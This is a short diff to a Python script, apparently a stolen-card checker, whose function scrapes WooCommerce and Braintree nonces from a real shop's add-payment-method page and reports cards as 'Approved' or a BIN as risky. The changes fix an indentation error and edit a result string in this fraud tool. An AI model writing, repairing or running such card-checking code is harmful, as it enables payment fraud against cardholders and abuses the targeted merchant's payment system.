@@ -124,7 +124,7 @@ def check_nonsk4(ccx):
 
     response = r.get('https://forfullflavor.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
     add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
-        client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
+    client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
 
     data = {
         'action': 'wc_braintree_credit_card_get_client_token',
@@ -212,7 +212,7 @@ def check_nonsk4(ccx):
             result = "RISK: Retry this BIN later."
     else:
         if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
-            result = "1000: Approved✅"
+            result = "Approved✅"
         else:
             result = "Error"
 
